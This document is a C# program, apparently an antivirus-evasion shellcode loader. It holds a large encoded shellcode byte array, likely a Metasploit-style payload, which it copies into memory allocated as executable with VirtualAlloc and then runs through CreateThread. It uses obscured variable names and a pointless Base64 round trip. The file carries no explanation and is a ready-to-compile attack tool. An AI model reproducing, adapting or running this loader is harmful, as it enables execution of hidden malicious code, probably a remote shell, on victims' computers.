using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
namespace Thiswillwork
{
    class Program
    {

        public static byte[] shellcode = new byte[] {0xdb,0xc2,0xbd,0x09,0xf5,0xa7,0x62,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1
,0xb8,0x31,0x68,0x17,0x03,0x68,0x17,0x83,0xe1,0x09,0x45,0x97,0x2a,0x22,0x53
,0x2c,0xe8,0x31,0xda,0x16,0x88,0x28,0xca,0xf2,0x5b,0x82,0xbc,0xb4,0xaa,0x67
,0xa7,0x35,0x27,0x7b,0xd4,0x4a,0x78,0x1e,0xbf,0x9e,0xa6,0xfe,0xc6,0x34,0xaf
,0xcb,0x97,0x4d,0xfe,0xcb,0x2a,0x11,0x50,0x95,0x3c,0x37,0x6d,0xa6,0x53,0x35
,0x48,0x18,0x04,0xa3,0x74,0x34,0x1e,0x3c,0xee,0x68,0xbb,0xff,0xed,0x21,0xfa
,0x0f,0x6b,0xe3,0x56,0x4a,0x1f,0x81,0x22,0xbc,0xed,0xf0,0x08,0x6a,0xce,0xa3
,0xe9,0x62,0xa4,0xdb,0xbb,0x96,0xca,0xb2,0x94,0x7e,0xd0,0x17,0x39,0x57,0xed
,0xb1,0x93,0xc3,0xcd,0xcf,0x53,0x32,0xb5,0x89,0x08,0x10,0x71,0x6a,0xa7,0xac
,0xeb,0x1d,0x54,0x08,0x54,0x5b,0xac,0x80,0x3a,0xd9,0xdc,0x48,0x17,0xcd,0xbb
,0x3c,0x76,0x6f,0x1e,0xe9,0xa8,0x55,0xf1,0x75,0x7a,0x62,0x3e,0x01,0x26,0xbf
,0xd3,0x72,0xbc,0x7f,0x5a,0x7a,0x7a,0x15,0xac,0xeb,0x18,0xf4,0xc7,0xda,0x22
,0x05,0x3d,0x03,0xa2,0x75,0x4a,0xa1,0x65,0x0d,0x07,0xbe,0xa7,0x31,0x81,0xde
,0x4b,0x2e,0xdc,0xb8,0xb1,0xb2,0x37,0xbd,0x41,0xcb,0x16,0xa6,0x7e,0xf6,0x1a
,0xb3,0x6e,0x9a,0x67,0xab,0x64,0x3f,0x5c,0xb3,0xa7,0x2b,0xd6,0xd5,0xc6,0xd9
,0xe7,0xe0,0xd9,0xda,0xeb,0xd3,0x69,0xd9,0x2e,0x9b,0xd4,0xc7,0x16,0x61,0x80
,0x71,0x84,0xd3,0xc6,0xc9,0x34,0x97,0x15,0x3f,0x88,0x76,0x86,0x51,0xa4,0x2e
,0x00,0x9d,0xda,0x1e,0x32,0x05,0x8c,0x82,0x35,0x8e,0x9f,0x1c,0x40,0x37,0x28
,0x17,0xf2,0xd1,0x45,0xa0,0xac,0x08,0xff,0x75,0xe7,0xae,0x43,0x9b,0xa5,0x6c
,0x11,0x6e,0xdc,0xe0,0x32,0x16,0x1f,0xe4,0x2f,0x00,0x37,0x72,0x9c,0xc2,0x45
,0xfd,0x38,0x81,0x38,0x28,0x09,0xa7,0xa3,0xe2,0x8d,0xcc,0x7a,0xa6,0x1b,0xab
,0x46,0x5b,0xea,0x33,0x80,0x8b,0xf9,0x4f,0x3f,0x3b,0xad,0xfd,0x92,0x57,0x88
,0x54,0x5b,0xec,0x3f,0x04,0xc0,0xcb,0xf1,0x46,0x02,0x74,0xa6,0x19,0x9a,0xed
,0x06,0x7a,0xce,0x8d,0x39,0x96,0x56,0x07,0x31,0x45,0x3a,0x76,0x5c,0xf2,0xdf
,0xa7,0x17,0xe0,0xf5,0x6b,0x48,0xa8,0xc5,0x1e,0x8a,0xc1,0x6b,0x16,0xc0,0x07
,0x3a,0x8b,0xf3,0x26,0x18,0xc3,0x35,0x4e,0xea,0xd5,0x50,0x2c,0x93,0x3f,0x44
,0xb4,0x8f,0x57,0xe5,0x88,0x8f,0x31,0x7d,0x95,0xf3,0x06,0x5a,0x65,0x6c,0xb2
,0x89,0xb4,0x15,0x7a,0xc7,0x27,0x85,0x0c,0x00,0xac,0x96,0x9d,0xaa,0xba,0xec
,0x64,0x98,0x03,0x42,0x25,0xb0,0xea,0x33,0xb5,0xa8,0xe4,0xa8,0x4e,0x01,0x5c
,0xd0,0x33,0x56,0xc6,0x26,0x72,0x33,0xad,0xe3,0x9d,0xef,0x1d,0x73,0x28,0x3f
,0xd5,0x69,0x58,0x28,0xa6,0x40,0xc2,0xc2,0xa9,0x2b,0x0e,0xb9,0x48,0xff,0x5c
,0xa6,0xe4,0x9e,0x9b,0x74,0xec,0x99,0x4e,0xa2,0x30,0xf4,0xc9,0x54,0xec,0x04
,0x0a,0xf3,0x59,0x49,0x0f,0x21,0xd5,0x35,0x8c,0x59,0xe3,0x32,0x14,0xec,0x31
,0x5d,0x70,0x96,0x6a,0x26,0xf8,0xe7,0x21,0x2d,0x1a,0x71,0x46,0x44,0x2d,0x3e
,0x16,0x68,0x6e,0x49,0x4c,0x27,0xbd,0x67,0x3f,0x23,0x62,0x88,0xf8,0x6a,0x8c
,0xe7,0xda,0x56,0x9f,0x41,0xbc,0xf3,0x46,0x16,0xd9,0x7f,0x4b,0x6c,0x4e,0xfd
,0x95,0x0b,0x87,0x39,0xfe,0xfa,0x52,0xc8,0xfb,0xbc,0xbe,0xaf,0x56,0x3d,0x16
,0x8d,0x8b,0xf9,0x0a,0x0f,0x98,0x4f,0xba,0xc2,0x60,0x85,0x9a,0x15,0xe3,0xed
,0x34,0x9d,0x5c,0x22,0x37,0x5f,0xfa,0xbd,0xa9,0x9b,0xd9,0x6b,0xc2,0x49,0xab
,0xa4,0x7e,0xdd,0xc8,0x7a,0x1e,0xed,0xa3,0xfe,0x27,0xc1,0xfd,0x50,0xc8,0x77
,0x53,0xed,0x00,0x2e,0x20,0x45,0xbb,0x1a,0x44,0xc0,0x11,0x00,0xe0,0x5e,0x32
,0x2a,0xea,0xd3,0xf8,0x45,0x2c,0x74,0x76,0x00,0xf8,0xd7,0x6c,0xa9,0x36,0x61
,0xd8,0x13,0xf7,0xb5,0x33,0x66,0x5b,0xcf,0x69,0xba,0xc6,0x17,0x60,0x62,0xb9
,0xba,0x39,0x37,0xb9,0x49,0x60,0x94,0xe6,0x6f,0x92,0xf4,0xee,0x91,0xcd,0xa4
,0x43,0x8a,0x3b,0x74,0x5f,0xc7,0xe1,0x0c,0x1a,0x19,0x98,0x86,0x69,0xf8,0xd9
,0x20,0x34,0x56,0x79,0x11,0x68,0x3e,0x3d,0xcf,0xa5,0xf6,0x8e,0xfb,0x03,0xce
,0x3e,0x9b,0x86,0x6d,0x7e,0xac,0xa1,0xe9,0xae,0xf9,0x21,0x8c,0xf9,0xdc,0x4e
,0xd1,0x01,0x1a,0x1c,0xe3,0xb0,0x0b,0x33,0x4f,0x57,0x50,0xc9,0x84,0xe9,0x82
,0x6d,0x1d,0x5d,0x33,0xfc,0x1b,0x53,0x1d,0xd2,0x57,0x2d,0x1f,0x78,0x31,0x87
,0xa0,0xbf,0xc0,0xef,0xa8,0xf7,0x68,0x87,0x11,0x0c,0xe2,0x72,0x89,0x76,0x66
,0x4a,0xad,0x71,0xce,0xd9,0x1c,0xbc,0x92,0xb1
 };

        static void Main(string[] args)
        {
            Console.Write("Whats goooddddd");
            Run();
        }
        private static void Run()
        {
            
            string s = Convert.ToBase64String(shellcode);
            byte[] newbyte = Convert.FromBase64String(s);

            UInt32 d = VirtualAlloc(0, (UInt32)newbyte.Length, MEMES, Paga);
            Marshal.Copy(newbyte, 0, (IntPtr)(d), newbyte.Length);
            IntPtr ss = IntPtr.Zero;
            UInt32 ssssw = 0;
            // prepare data
            IntPtr ww = IntPtr.Zero;
            // execute native code
            ss = CreateThread(0, 0, d, ww, 0, ref ssssw);
            WaitForSingleObject(ss, 0xFFFFFFFF);
        }

        private static UInt32 MEMES = 0x1000;
        private static UInt32 Paga = 0x40;
        private static string kern = "K";
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
           UInt32 lpThreadAttributes,
           UInt32 dwStackSize,
           UInt32 lpStartAddress,
           IntPtr param,
           UInt32 dwCreationFlags,
           ref UInt32 lpThreadId
         );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
         }
}